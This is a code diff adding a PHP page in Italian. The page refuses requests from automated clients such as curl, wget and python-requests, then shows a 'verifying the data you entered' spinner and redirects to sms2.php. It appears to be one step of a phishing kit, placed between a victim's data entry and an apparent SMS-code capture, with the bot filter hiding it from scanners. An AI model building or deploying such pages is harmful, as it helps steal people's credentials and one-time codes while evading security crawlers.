@@ -1,0 +1,79 @@
+<?php
+// Anti-bot check - only block empty or exact known bot user agents
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+$blockedAgents = [
+    '',
+    'curl',
+    'wget',
+    'python-requests',
+    'httpclient',
+    'java',
+];
+
+foreach ($blockedAgents as $block) {
+    if ($userAgent === $block) {
+        header('HTTP/1.1 403 Forbidden');
+        exit('Access denied.');
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Attendere...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="refresh" content="3;url=sms2.php" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #f3f3f3;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .wait-container {
+      background: white;
+      padding: 40px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      max-width: 400px;
+      width: 90%;
+    }
+    .wait-container h1 {
+      color: #e94e1b;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .wait-container p {
+      font-size: 16px;
+      color: #333;
+    }
+    .loader {
+      margin: 20px auto;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #e94e1b;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="wait-container">
+    <div class="loader"></div>
+    <h1>Elaborazione in corso...</h1>
+    <p>Attendere qualche secondo, stiamo verificando i dati inseriti.</p>
+  </div>
+</body>
+</html>
